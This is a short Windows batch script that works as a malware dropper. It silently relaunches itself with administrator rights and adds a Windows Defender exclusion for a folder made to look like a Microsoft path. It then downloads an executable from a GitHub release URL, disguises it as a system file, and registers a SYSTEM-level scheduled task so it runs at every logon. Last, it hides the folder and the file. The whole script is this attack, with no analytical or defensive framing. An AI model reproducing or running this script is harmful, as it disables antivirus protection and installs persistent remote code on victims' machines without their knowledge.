@echo off

if "%~1"=="-hidden" goto :payload

powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '-hidden' -WindowStyle Hidden -Verb RunAs"
exit /b

:payload

set "TARGET_DIR=C:\ProgramData\Microsoft\Framework"
set "TARGET_FILE=%TARGET_DIR%\MsHostStorage.exe"
set "URL=https://github.com/Putin6969/leach/releases/download/1.3/RATIONAL_FOOD.exe"
set "TASK_NAME=Microsoft\Windows\Management\Provisioning\SystemCheck"

if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1

powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'" >nul 2>&1

powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%TARGET_FILE%' -UseBasicParsing" >nul 2>&1

schtasks /create /tn "%TASK_NAME%" /tr "'%TARGET_FILE%'" /sc onlogon /rl highest /ru "SYSTEM" /f >nul 2>&1

schtasks /run /tn "%TASK_NAME%" >nul 2>&1

attrib +s +h "%TARGET_DIR%" >nul 2>&1
attrib +s +h "%TARGET_FILE%" >nul 2>&1

exit
